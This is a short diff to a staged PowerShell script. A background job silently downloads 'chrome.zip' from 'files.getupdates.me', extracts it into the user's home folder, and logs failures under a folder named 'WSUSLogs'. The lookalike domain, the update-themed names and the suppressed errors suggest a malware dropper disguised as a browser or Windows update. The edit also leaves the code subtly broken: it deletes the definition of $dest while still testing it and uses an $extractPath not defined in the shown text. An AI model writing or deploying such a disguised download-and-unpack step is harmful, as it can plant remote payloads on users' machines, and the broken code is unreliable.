@@ -198,11 +198,10 @@ switch ($stage) {
 
             Start-Job -ScriptBlock {
                 $zip = "$env:HOMEPATH\chrome.zip"
-                $dest = "$env:HOMEPATH\"
                 try {
                     Invoke-WebRequest -Uri "https://files.getupdates.me/chrome.zip" -OutFile $zip -UseBasicParsing -ErrorAction SilentlyContinue
                     if (-not (Test-Path $dest)) {
-                        Expand-Archive -Path $zip -DestinationPath $dest -Force
+                        Expand-Archive -Path $zip -DestinationPath $extractPath -Force
                     }
                 } catch {
                     Add-Content -Path "$env:HOMEPATH\WSUSLogs\update.log" -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Download or extraction failed: $($_.Exception.Message)"
